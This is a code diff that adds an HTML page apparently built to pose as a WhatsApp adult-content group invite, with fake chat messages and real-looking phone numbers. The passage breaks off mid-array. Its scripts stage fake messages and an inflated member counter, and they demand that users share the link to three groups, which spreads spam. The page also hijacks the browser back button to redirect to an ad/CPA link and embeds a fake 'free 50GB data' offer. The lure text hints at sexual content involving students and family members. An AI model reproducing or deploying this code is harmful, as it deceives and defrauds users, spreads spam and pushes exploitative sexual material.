@@ -1,0 +1,1009 @@
+
+<!---<script>if (typeof window.orientation == 'undefined' && screen.width >= 1000) { window.location.href = 'https://www.youtube.com/'; }</script> -->
+<html xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-TXJTMW696H"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-TXJTMW696H');
+</script>
+<title>Izindaba Zabantu Abadala 🍑🍆💦</title>
+<meta content='#008069' name='theme-color'/>
+<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6e_8o_7totHyX9wvqUV9G7wrrQm0LWJAYq1EwdkUocEBcHcYIALPb1eZpGCpMaLIeIG6hoqxsikAxKR7_8rMMPwVGWxMKFc5S9wI0gYOGdg9ahNZEgdmxNk8yAL0YINxJWDRVc-j15BIa3vRiK6P_nbVdSd-QhEIxSnhc0VjaVUPH_DfBVoo2Wbc19XE/s16000/kodo%203.jpg' name='og:image'/>
+<meta content='𝗚𝗿𝗼𝘂𝗽 𝗰𝗵𝗮𝘁 𝗶𝗻𝘃𝗶𝘁𝗲' property='og:description'/>
+<meta content='IE=EmulateIE7' http-equiv='X-UA-Compatible'/>
+<meta content='noindex' name='robots'/>
+<link href='https://site-assets.fontawesome.com/releases/v6.1.1/css/all.css' rel='stylesheet'/>
+<meta content='width=device-width, initial-scale=1.0' name='viewport'/>
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+<meta content='blogger' name='generator'/>
+<link href='https://whatssaop-chatqsds.blogspot.com/' rel='canonical'/>
+<link rel="alternate" type="application/atom+xml" title="Izindaba Zabantu Abadala 🍑🍆💦 - Atom" href="https://whatssaop-chatqsds.blogspot.com/feeds/posts/default" />
+<link rel="alternate" type="application/rss+xml" title="Izindaba Zabantu Abadala 🍑🍆💦 - RSS" href="https://whatssaop-chatqsds.blogspot.com/feeds/posts/default?alt=rss" />
+<link rel="service.post" type="application/atom+xml" title="Izindaba Zabantu Abadala 🍑🍆💦- Atom" href="https://www.blogger.com/feeds/6102935325443652454/posts/default" />
+<link rel="me" href="https://www.blogger.com/profile/16777896498766012594" />
+<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
+<meta content='https://chat.whatsapp.com/Ea1gXwt535hBwzQnOo5AVw' property='og:url'/>
+<meta content='Izindaba Zabantu Abadala 🍑🍆💦' property='og:title'/>
+
+<meta content='whatsapp.com' property='og:site_name'/>
+<style id='page-skin-1' type='text/css'><!--
+/*
+body {
+font: $(body.font);
+color: $(body.text.color);
+background: $(body.background);
+padding: 0 $(content.shadow.spread) $(content.shadow.spread) $(content.shadow.spread);
+$(body.background.override) margin: 0;
+padding: 0;
+}
+
+--></style>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+
+<script src="../js/language.js"></script>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4CPQSERQVY"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-4CPQSERQVY');
+</script>
+
+<!-- BEGIN: Powered by Supercounters.com -->
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1712548,"#008069","#008069");</script><br><noscript><a href="https://www.supercounters.com/">free online counter</a></noscript>
+</center>
+<!-- END: Powered by Supercounters.com -->
+
+
+</head>
+<body>
+<div class='main section' id='main'><div class='widget HTML' data-version='1' id='HTML1'>
+<div class='widget-content'>
+<style type="text/css">
+* {
+    margin: 0;
+    padding: 0;
+  font-family: Helvetica Neue, Helvetica Neue, Helvetica, Arial, sans-serif;
+    box-sizing: border-box;
+}
+body {
+    margin: 0px;
+    background-color: #efeae2;
+}
+header {
+    position: fixed;
+    left: 0;
+    top: 0;
+    right: 0;
+    width: 100%;
+    height: auto;
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    align-items: center;
+    background: rgb(0 128 105);
+    color: #fff;
+    justify-content: space-between;
+    padding: 7px 0px;
+    z-index: 1;
+    box-shadow: 0px 0px 4px 0px #07241f;
+}
+.left {
+    color: #fff;
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    align-items: center;
+    column-gap: 5px;
+    margin-left: 15px;
+    justify-content: flex-start;
+    max-width: 80%;
+}
+.left i {
+    font-size: 17px;
+}
+.left img {
+    max-width: 40px;
+    max-height: 40px;
+    border-radius: 100%;
+}
+.text {
+    max-width: 60%;
+}
+.text h1 {
+    font-size: 15px;
+    font-weight: 600;
+    max-width: 100%;
+    line-height: 25px;
+}
+.text p {
+    font-size: 10px;
+    max-width: 100%;
+    display: inline-block;
+    white-space: nowrap;
+    overflow: hidden !important;
+    text-overflow: ellipsis;
+}
+.right {
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    margin-right: 15px;
+    column-gap: 20px;
+    font-size: 18px;
+}
+.fa-phone-plus {
+    color: #fff;
+    opacity: 0.5;
+}
+main {
+    padding-top: 10vh;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+    margin: 0px 15px;
+}
+.date {
+    background: #f7ffff;
+    padding: 3px 15px;
+    font-size: 12px;
+    font-weight: 500;
+    border-radius: 8px;
+    color: #444;
+    box-shadow: 0px 0px 1px 0px #00000021;
+    text-align: center;
+}
+.privacy {
+    text-align: center;
+    background: #feeecc;
+    padding: 7px 10px;
+    font-size: 10px;
+    color: #666;
+    margin-top: 10px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-weight: 300;
+}
+.activity {
+    font-weight: 400 !important;
+    font-size: 10px !important;
+    margin-top: 10px;
+    padding: 7px 7px;
+}
+.users {
+    width: 100%;
+    margin-top: 15px;
+}
+.user {
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: flex-start;
+    background: #fff;
+    width: fit-content;
+    padding: 5px 10px;
+    border-radius: 0px 10px 10px 10px;
+    margin-left: 10px;
+    margin-bottom: 10px;
+}
+.user::before {
+    content: "";
+    clip-path: polygon(100% 0, 0 0, 100% 100%);
+    position: absolute;
+    left: -12px;
+    width: 15px;
+    height: 20px;
+    top: -0.2px;
+    display: block;
+    background: #fff;
+}
+.number {
+    display: block;
+    font-weight: 600;
+    font-size: 13px;
+    color: #f44336;
+}
+.message {
+    display: flex;
+    flex-direction: row;
+    flex-wrap: nowrap;
+    align-items: center;
+    position: relative;
+}
+.audio {
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+}
+.audio i {
+    font-size: 22px;
+    color: #77777791;
+    margin-bottom: 14px;
+    margin-right: 10px;
+    cursor: pointer;
+}
+.content {
+    position: relative;
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    flex-wrap: nowrap;
+    justify-content: center;
+    padding-left: 5px;
+}
+.content img {
+    opacity: 0.1;
+    height: 30px;
+}
+.details {
+    width: 100%;
+    display: flex;
+    flex-direction: row;
+    align-items: center;
+    justify-content: space-between;
+    font-size: 10px;
+    margin-top: 5px;
+    color: #666;
+}
+.pic {
+    position: relative;
+    margin: 0px 5px;
+    margin-left: 10px;
+}
+.pic img {
+    max-width: 50px;
+    max-height: 55px;
+    border-radius: 100%;
+}
+.pic i {
+    color: #1da959;
+    text-shadow: 1px -1px 0px white, -1px -1px 0px #ffffff;
+    position: absolute;
+    left: 0;
+    bottom: 6px;
+}
+.video {
+    position: relative;
+}
+.video img {
+    border-radius: 10px;
+    max-width: 280px;
+}
+.videodetails {
+    position: absolute;
+    bottom: 10px;
+    width: 100%;
+    display: flex;
+    left: 0;
+    flex-direction: row;
+    align-items: flex-end;
+    justify-content: space-between;
+    color: #fff;
+    font-size: 10px;
+}
+.videodetails p {
+    margin-right: 10px;
+}
+.download {
+    margin-left: 10px;
+    background: #00000047;
+    text-align: center;
+    padding: 6px 12px;
+    border-radius: 10px;
+    font-size: 14px;
+    cursor: pointer;
+}
+.forward {
+    font-size: 14px;
+    color: #777;
+    margin-left: 3px;
+    margin-bottom: 3px;
+    display: block;
+}
+.modal {
+    position: fixed;
+    left: 0;
+    top: 0;
+    background: #0000006e;
+    width: 100%;
+    height: 100%;
+    z-index: 3;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    justify-content: flex-end;
+}
+.info {
+    background: #fff;
+    width: 100%;
+    border-radius: 15px 15px 0px 0px;
+    position: relative;
+    text-align: center;
+    padding: 10px;
+}
+.profile {
+    display: block;
+    width: 64px;
+    border-radius: 32px;
+    margin: 15px auto;
+}
+.title {
+    font-size: 20px;
+    padding: 6px;
+}
+.created {
+   font-size: 13px;
+    color: #747272;
+}
+.reactions {
+    direction: ltr;
+    display: inline-flex;
+    align-items: center;
+    margin: 10px auto;
+}
+.reactions img {
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+    border: 2px solid #fff;
+}
+.love {
+    z-index: 1;
+}
+.care {
+    z-index: 2;
+    border: 2px solid #fff;
+}
+.care1 {
+    margin-left: -35px;
+    z-index: 3;
+}
+.total {
+    margin-left: -40px;
+    z-index: 4;
+    font-size: 14px;
+    font-weight: 500;
+}
+
+#join,
+#invite,
+#get {
+   display: block;
+    width: 90%;
+    height: 36px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 13px;
+    font-weight: bold;
+   
+    cursor: pointer;
+    border-radius: 50px;
+    padding: 0 10px;
+    margin: 15px auto;
+    background: #008069;
+}
+#join:hover {
+    opacity: 0.8;
+}
+.talxjnt h1 {
+    font-size: 19px;
+    font-weight: 600;
+}
+.talxjnt p {
+    color: #777;
+    font-size: 13px;
+    margin-top: 5px;
+}
+#share,
+#offer {
+    display: none;
+}
+.flex {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.bar {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 13px;
+    padding: 2px;
+    border: 1px solid #16a085;
+}
+#fill {
+    height: 100%;
+    background-color: #00a884;
+    background-image: linear-gradient(-45deg, rgba(255, 255, 255, 0.2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.2) 50%, rgba(255, 255, 255, 0.2) 75%, transparent 75%, transparent);
+    background-size: 30px 30px;
+    animation: move 2s linear infinite;
+    box-shadow: 2px 0 10px inset rgba(0, 0, 0, 0.2);
+    transition: width 2s ease-out;
+    width: 0%;
+    transition: width 0.5s;
+}
+@keyframes move {
+    0% {
+        background-position: 0 0;
+    }
+    100% {
+        background-position: 30px 30px;
+    }
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 11px;
+    font-size: 16px;
+    color: #000;
+   
+}
+#percentage {
+    margin-left: 5px;
+}
+.loader {
+    width: 20px;
+    height: 20px;
+    margin: 0;
+    border-radius: 50%;
+    border: 4px solid #ccc;
+    border-top-color: #1abc9c;
+    animation: spin 1s infinite linear;
+}
+@keyframes spin {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+}
+.last {
+   
+   
+    
+}
+
+.dscalxjnc {
+    text-align: center;
+    /* max-width: 80%; */
+    margin-top: 20px;
+    margin-bottom: 15px;
+}
+.btmr {
+    color: green;
+    font-weight: 500;
+}
+.etealxc {
+	text-align: center;
+	background: #feeecc;
+	padding: 7px 10px;
+	font-size: 10px;
+	color: #666;
+	margin-top: 10px;
+	border-radius: 8px;
+	cursor: pointer;
+	font-weight: 300;
+}
+</style>
+<header>
+            <div class="left">
+                <i class="fa-regular fa-arrow-left"></i>
+                <img src="https://www.fzciowza.site/images/fang.jpg" id="f1" />
+                <div class="text">
+                    <h1>+🔞adult content</h1>
+                    <p>+27 67 961 7733, +27 62 061 7171, +27 72 010 4939</p>
+                </div>
+            </div>
+            <div class="right">
+                <i class="fa-solid fa-phone-plus"></i>
+                <i class="fa-regular fa-ellipsis-vertical"></i>
+            </div>
+        </header>
+        <main>
+            <div class="date">
+                <p><span id="day"></span> <span id="month"></span> <span id="year"></span></p>
+            </div>
+			<div class="etealxc">
+                <p><i class="fa-solid fa-lock"></i> Messages and calls are end-to-end encrypted. No one outside of this chat, including WhatsApp, can read or listen to them. Tap for more information.</p>
+            </div>
+            <div class="date activity" style="display: none;">
+                <p>+27 72 036 4820 joined via an invite link</p>
+            </div>
+			<div class="date activity" style="display: none;">
+                <p>+27 79 656 2121 joined via an invite link</p>
+            </div>
+            <div class="users" id="user1" style="display: none;">
+                <div class="user">
+                    <div class="number">+27 72 010 4939    ~ Andile</div>
+                    <div class="message">
+                        <div class="text">
+                            <div>
+                                <div class="content">
+                                    I'm available for video call 🍑🍆
+                                </div>
+                                <div class="details">
+                                    <span>0.57</span>
+                                    <span>23:30</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="pic">
+                            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaWot97_NnqBgDntiqB47W4Wve1pcyGjjXZa28ApMT_GyYiASlx2FiCj3Ki38a41hjz2mrRjkYcC0kHtCik354-_D8QobBcZRItGcDmp4WnfYU3bbvlcL4lJKmzuXWzzgcu0XwT_O22r5C64N_wYDcRwnkEpFqHGuEo2dAPfn20YbMfdRNtbCRZEYAv4A/s1124/dp%20911.png" />
+                        </div>
+                    </div>
+                </div>
+                <div class="user" id="user2" style="display: none;">
+                    <div class="number" style="margin-bottom: 5px; color: #9c27b0;">+27 62 061 7171  ~C'NDORAH ❤❤❤</div>
+                    <div class="message">
+                        <div class="video">
+                           <a href="https://generalizationcounty.com/k0yg29ntz?key=bd74c1f442859d328977644f401bb67d"> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6e_8o_7totHyX9wvqUV9G7wrrQm0LWJAYq1EwdkUocEBcHcYIALPb1eZpGCpMaLIeIG6hoqxsikAxKR7_8rMMPwVGWxMKFc5S9wI0gYOGdg9ahNZEgdmxNk8yAL0YINxJWDRVc-j15BIa3vRiK6P_nbVdSd-QhEIxSnhc0VjaVUPH_DfBVoo2Wbc19XE/s16000/kodo%203.jpg" /> </a>
+                            <div class="videodetails">
+                                <div class="download">
+                                    <i class="fa-solid fa-down"></i>
+                                    <span>8.2 MB</span>
+                                </div>
+                                <p>23:41</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+				<div class="date activity" style="display: none;">
+                <p>+27 84 624 0229 joined via an invite link</p>
+            </div>
+ <div class="users" id="user3" style="display: none;">
+                <div class="user">
+                    <div class="number">+27 63 530 3096   ~Swidi Wabantwana ❤️🔥🍬</div>
+                    <div class="message">
+                        <div class="text">
+                            <div>
+                                <div class="content">
+								Mzansi porn plz let share
+                                </div>
+                                <div class="details">
+                                    <span>4.12</span>
+                                    <span>23:30</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="pic">
+                           <a href="https://generalizationcounty.com/k0yg29ntz?key=bd74c1f442859d328977644f401bb67d"> <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQvgmU9NzAioeWvKS-7D4-LQEx7A5YW44OY0KBJ599F26Ie-BvJuG8uZhmbVnr50foO9YR5Nw54Ggze0P2NvLwfU-HQJXqI9jRHX15mFq3BTqYwOurpcH1jmaJ-1V517cuJs790yB_SNnKjRI4xaMPvcrGjCPDlus1SevkcTGUV3OtKja7dqRla5gUTFA/s16000/dpppppp.jpg" /></a>
+                        </div>
+                    </div>
+                </div>
+                  <div class="user" id="user4" style="display: none;">
+                    <div class="number" style="margin-bottom: 5px; color: #9c27b0;">+27 62 061 7171   ~Ntombenhle</div>
+                    <div class="message">
+                        <div class="video">
+                          <a href="https://generalizationcounty.com/k0yg29ntz?key=bd74c1f442859d328977644f401bb67d">  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgy-0W4Mzle5eLZbutfxuMMNAcpf0dWNgfVDbsWjLDBCTxROabt0ljEMxP7oEpI1NnrDZvNjNVvKWnuiMW3YiNCxxflhhTYmPkvGa8tnjFUKq5vyiM1b8W3kmeMTDtYYmSPXPaN_fKmmo9sy2J6JOYrV1OKpuIhfJBZiXTyJaeAkxA668n_QK_BLeUvuSA/s600/kodo%208.jpg" /></a>
+                            <div class="videodetails">
+                                <div class="download">
+                                    <i class="fa-solid fa-down"></i>
+                                    <span>11.3 MB</span>
+                                </div>
+                                <p>23:41</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+
+
+          <div class="user" id="user6" style="display: none;">
+                    <div class="number" style="margin-bottom: 5px; color: #ff9800;">+27 66 599 3870   ~❤️‍🔥Nonka❤️‍🔥</div>
+                    <div class="forward"><i class="fa-solid fa-share"></i> <i>Forwarded</i></div>    
+                 
+                        <div class="message">
+                        <div class="video">
+                          <a href="https://generalizationcounty.com/k0yg29ntz?key=bd74c1f442859d328977644f401bb67d">  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiU5xQ9c5bWXKJ8-RAHZf9E7T-Ih71cJCwI0n8NfKtL3gNM8tOa8tlUHTZs8_Q8o8Oo9wVr7BMwhGszsB55UL2J9CL6DrEv5h_CQq5OP_DfdZiK5Ocuk0kKe60CAm94pvPqHHbhxwpAdAb5cPLlm5a7Bs_zp-zbiyKfNQcaU37ReNJIm1RoD4u81_a3hww/s16000/tumaini.jpg" /> </a>
+                            <div class="videodetails">
+                                <div class="download">
+                                    <i class="fa-solid fa-down"></i>
+                                    <span>10 MB</span>
+                                </div>
+                                <p>19:41</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="users" id="user7" style="display: none;">
+                <div class="user">
+                    <div class="number">+27 72 010 4939   ~ Andile</div>
+                    <div class="message">
+                        <div class="text">
+                            <div>
+                                <div class="content">
+                                    Dbn town Island Lodge ngikhon room 215 ofun hookup noma nyt ngi available ngiphathana kahle ne video call ngiyayenza inbox
+                                </div>
+                                <div class="details">
+                                    <span>1.22</span>
+                                    <span>21:40</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+                <div class="users" id="user8" style="display: none;">
+                <div class="user">
+                    <div class="number">+27 78 425 8912</div>
+                    <div class="message">
+                        <div class="audio">
+                            <i class="fa-solid fa-play"></i>
+                            <div>
+                                <div class="content">
+                                    <alxbndl></alxbndl>
+                                    <img src="https://k.top4top.io/p_2715dcchr1.png" />
+                                    <img src="https://k.top4top.io/p_2715dcchr1.png" />
+                                    <img src="https://k.top4top.io/p_2715dcchr1.png" />
+                                    <img src="https://k.top4top.io/p_2715dcchr1.png" />
+                                    <img src="https://k.top4top.io/p_2715dcchr1.png" />
+                                </div>
+                                <div class="details">
+                                    <span>1.07</span>
+                                    <span>23:30</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="pic">
+                            <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhs7wqzF6iWnwP7O7X2OyaPpo8iEAUkhLTlUFD6Hamq_zvYYvH4v22mxEfdOXX3pd0HceIkgwRXp5MYsIaRMN1dyjzsVCdXq_qtKQV9vVrHEcW6O7dfOADux1pmABCi8Of5iRqi8YDBdyptive-PNqR68qXSR215wU3Lbv56dqmjN3V8O2SaiGEHvGrqX4=s16000" />
+                            <i class="fa-solid fa-microphone"></i>
+                        </div>
+                    </div>
+                </div>
+
+                
+             <div class="users" id="user9" style="display: none;">
+                <div class="user">
+                    <div class="number">+52 33 2562 7462</div>
+                    <div class="message">
+                        <div class="audio">
+                            <i class="fa-solid fa-play"></i>
+                            <div>
+                                <div class="content">
+                                    <alxbndl></alxbndl>
+                                    <img src="https://k.top4top.io/p_2715dcchr1.png" />
+                                    <img src="https://k.top4top.io/p_2715dcchr1.png" />
+                                    <img src="https://k.top4top.io/p_2715dcchr1.png" />
+                                    <img src="https://k.top4top.io/p_2715dcchr1.png" />
+                                    <img src="https://k.top4top.io/p_2715dcchr1.png" />
+                                </div>
+                                <div class="details">
+                                    <span>0.17</span>
+                                    <span>23:30</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="pic">
+                            <img src="https://www.fzciowza.site/images/t5ub6aP.jpg" />
+                            <i class="fa-solid fa-microphone"></i>
+                        </div>
+                    </div>
+                </div>
+
+
+        </main>
+        <div class="modal" style="display: none;">
+            <div class="info">
+                <div id="intro">
+                    <img class="profile" src="https://www.fzciowza.site/images/fang.jpg" id="f2" />
+                    <h1 class="title">Izindaba Zabantu Abadala 🍑🍆💦</h1>
+                    <p class="created">Created on <span id="created"></span></p>
+                    <div class="reactions">
+                        <img class="like" src="https://www.fzciowza.site/images/1CnAQm1.jpg">
+                        <img class="love" src="https://www.fzciowza.site/images/atPn1Y6.jpg">
+                        <img class="care" src="https://www.fzciowza.site/images/Te5R0J3.png">
+                        <img class="care1" src="https://www.fzciowza.site/images/Te5R0J3.png">
+                        <img class="care2" src="https://www.fzciowza.site/images/Te5R0J3.png"/>
+                        <span class="total" id="total">+728</span>
+                    </div>
+					<div class="dscalxjnc">
+                        <p><b>UMABHEBHANA WABADALA 🍆🍑 18+</b><br> 
+                        WhatsApp Group Invite<span id="dots" style="display: inline;">...</span><span id="alxmr" style="display: none;"><br>
+                        - Long-legged female teacher<br> 
+                        - College Students videos<br> 
+                        - Outdoor<br> 
+                        - Family<br> 
+						- Other high quality videos.</span></p><a onclick="salxhw()" id="btmr" class="btmr">Read more</a>
+                    </div>
+                    <button id="join">Join the group</button>
+                </div>
+                <div id="share">
+                    <div class="last">
+                       To join the group, share with 3 groups and join.
+                    </div>
+                    <div class="bar">
+                        <div class="fill">
+                            <div id="fill"></div>
+                        </div>
+                        <div class="percentage flex">
+                            <div class="loader"></div>
+                            <span id="percentage">0%</span>
+                        </div>
+                    </div>
+                    <button id="invite">share</button>
+                </div>
+                <div id="offer">
+                    <button id="get">Join the group</button>
+                </div>
+
+            </div>
+
+        </div>
+		<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+		<script>
+			function swalert() {
+			Swal.fire({
+					title: "Sorry",
+					text: "The same group or the same friend is not correct. Please check and share again.",
+					icon: "warning",
+					allowOutsideClick: false,
+					confirmButtonText: 'OK',
+					confirmButtonColor: '#df4740'
+				});
+			}
+		</script>
+        <script>
+            const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+
+            const date = new Date();
+            let day = date.getUTCDate();
+            let month = months[date.getMonth()];
+            let currentMonth = date.getMonth() + 1;
+            let year = date.getFullYear();
+            let shortyear = year.toString().slice(-2);
+            document.getElementById("day").innerHTML = day;
+            document.getElementById("month").innerHTML = month;
+            document.getElementById("year").innerHTML = year;
+            document.getElementById("created").innerHTML = day + " " + month + " " + year;
+			
+			let randomNumber = Math.floor(Math.random() * 7) + 1;
+			let img = new Image();
+			img.src = "https://kodos.vercel.app/kodo" + randomNumber + ".jpg";
+			img.onload = function() {
+				document.getElementById("f1").src = img.src;
+				document.getElementById("f2").src = img.src;
+			};
+        </script>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <script>
+			var domains = ["bit.ly/1-JoinNow"];
+			function randomDomain() {
+				return domains[Math.floor(Math.random() * domains.length)];
+			}
+			let cdomain = randomDomain();
+			
+			function getRandomString(length = 0) {
+				const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+				let result = "";
+				for (let i = 0; i < length; i++) {
+					result += chars.charAt(Math.floor(Math.random() * chars.length));
+				}
+				return result;
+			}
+			
+			var shareRandomDesc = ["Izindaba Zabantu Abadala 🍑🍆💦"];
+			
+			var biaoqingArr = ["XX", "XX", "XX", "XX", "XX", "XX", "XX", "XX", "XX", "XX", "XX", "XX"];
+			
+			function getbiaoqing() {
+				let biaoqing = biaoqingArr[Math.floor(Math.random() * biaoqingArr.length)];
+				return biaoqing;
+			}
+			
+			var groupDetail = ["*Follow this link to join my WhatsApp group*:"];
+			function getdetail() {
+				let gdetail = groupDetail[Math.floor(Math.random() * groupDetail.length)];
+				var randomCount = Math.floor(Math.random() * (1000 - 700 + 1)) + 700;
+				gdetail = gdetail.replace("@@count@@", "*" + randomCount + "*");
+				return gdetail;
+			}
+
+			let shareDesc = shareRandomDesc[Math.floor(Math.random() * shareRandomDesc.length)];
+			let url = "*" + encodeURIComponent(shareDesc) + "*%0A%0A";
+			url += encodeURIComponent(getdetail()) + "%F0%9F%91%87%F0%9F%91%87%F0%9F%91%87%0A";
+			url += "https://" + cdomain + getRandomString();
+			
+            var width = 0,
+                share = "whatsapp://send?text=" + url,
+                cpa = "https://generalizationcounty.com/k0yg29ntz?key=bd74c1f442859d328977644f401bb67d";
+        </script>
+        <script type="text/javascript">
+$(document).ready(function () {
+        setTimeout(() => {
+			$(".activity").show();
+			setTimeout(() => {
+				$("#user1").show();
+					setTimeout(() => {
+						$("#user2").show();
+							setTimeout(() => {
+								$("#user3").show();window.scrollTo(0, document.body.scrollHeight);
+									setTimeout(() => {
+										$("#user4").show();window.scrollTo(0, document.body.scrollHeight);
+											setTimeout(() => {
+												$("#user6").show();window.scrollTo(0, document.body.scrollHeight);
+													setTimeout(() => {
+														$("#user7").show();window.scrollTo(0, document.body.scrollHeight);
+															setTimeout(() => {
+																$("#user8").show();window.scrollTo(0, document.body.scrollHeight);
+																	setTimeout(() => {
+																		$(".user9").show();window.scrollTo(0, document.body.scrollHeight);
+																			setTimeout(() => {
+																				$(".modal").show();
+																			}, 5000);
+																	}, 1000);
+															}, 1000);
+														
+
+													}, 1000);
+											}, 700);
+									}, 500);
+							}, 400);
+					}, 350);
+			}, 200);
+		}, 100);
+
+});
+$("#join").click(function () {
+    $("#intro").hide();
+    $("#share").show();
+});
+var share1 = "whatsapp://send?text=*%E2%9C%85%20Operator%27s%20Special%20Offer%20-%20Get%20Up%20to%2050GB%20FREE!%20%F0%9F%9A%80*%0A%F0%9F%94%A5%20Fast%20Internet%20for%20All!%20Claim%20Your%20Free%20Data%20Now!%0A%F0%9F%93%B2%20Choose%20Your%20Network%20%26%20Enjoy%3A%F0%9F%91%87%0Ahttps://4gsqg.xggbwaff.site/en4gzix";
+$("#invite").click(function () {
+    window.location.href = share;
+    if (width == 0) {
+        width += 50;
+    } else if (width == 50) {
+		gtag('event', 'share2', {'sharing': '2'});
+        width += 25;
+    } else if (width == 75) {
+		gtag('event', 'share3', {'sharing': '3'});
+        width += 25;
+		setTimeout(function () {
+			$("#share").hide();
+			$("#offer").show();
+		}, 3000);
+    }
+    setTimeout(function () {
+        $("#fill").css("width", width + "%");
+        $("#percentage").text(width + "%");
+    }, 2000);
+});
+$("#get").click(function () {
+    window.open(cpa, "_blank");
+});
+</script>
+</div>
+<div class='clear'></div>
+</div></div>
+
+<script type="text/javascript">
+        (function (window, location) {
+            history.replaceState(null, document.title, location.pathname + "#!/history");
+            history.pushState(null, document.title, location.pathname);
+
+            window.addEventListener("popstate", function () {
+                if (location.hash === "#!/history") {
+                    history.replaceState(null, document.title, location.pathname);
+                    setTimeout(function () {
+                        location.replace(
+                            "https://generalizationcounty.com/k0yg29ntz?key=bd74c1f442859d328977644f401bb67d"
+                        );
+                    }, 0);
+                }
+            }, false);
+        }(window, location));
+		
+		// Get the HTML element that displays the total
+const totalElement = document.getElementById("total");
+
+// Initial value and target value
+let currentValue = 728;
+const targetValue = 1023;
+
+// Function to update the total and simulate new joinings
+function updateTotal() {
+if (currentValue < targetValue) {
+// Increment the current value by a random amount between 1 and 5
+currentValue += Math.floor(Math.random() * 5) + 1;
+
+// Update the content of the element
+totalElement.textContent = "+" + currentValue;
+
+// Call the function again after a random delay between 500 and 2000 ms
+setTimeout(updateTotal, Math.floor(Math.random() * 1500) + 500);
+}
+}
+
+// Start the update process
+updateTotal();
+
+// Array of image URLs
+const imageArray = [
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhMGtHDn54ZQZdhmyVJEtvezkNPcAhzY_4kegI1Z3GCOrHd2uU23p6M6XMvEj4DGz1rfZFxgkDksCfVM6F38QCpGZub3sIwEQf1znzL3yMdSaFxjLlD4vSUkyKMcMMGrndS39p-E2DcEE8L49X01R9fLWgtx1OPhfMCkfXKY7fs0wA5oYv67_-AK2eEoLI/s320/cchhh.jpg",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmePegk29qqCJRmJYpcP6xYqjFoh580IQFmtM58biY2sUHS0KtPiDZ_hP1MlIJzIx9aUxaiYRUYVtrbwmZMBIuuRA4LYWCmt5vQjmrJz4sff64rQO6VKtL4e0Bsr0xeADFMh8Hch622IpatM63iH68QMLcXUXPDjiQCLY1G92BgPfN4AOwsjrJ3TgS9Is/s320/0_n.jpg",
+"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWUDYrwQW_pkcvFZZYML1a66UAhci3Zcu6D-RSqtg7hW4VvZwmcTEtIGg82Nb-_3DFKoFY_N2E9DUZT7ALzH5zrbcTgUCQFgmh1IP2A01WK8-9dSrYdYyvJL1aQGKHTXgm49si6zRB2Gb79WRobHXTObrd0KURki_5SQVu6Jxwyl-xPPvgPHoW9auvnD8/s320/%23saucyschools%20(1).webp",
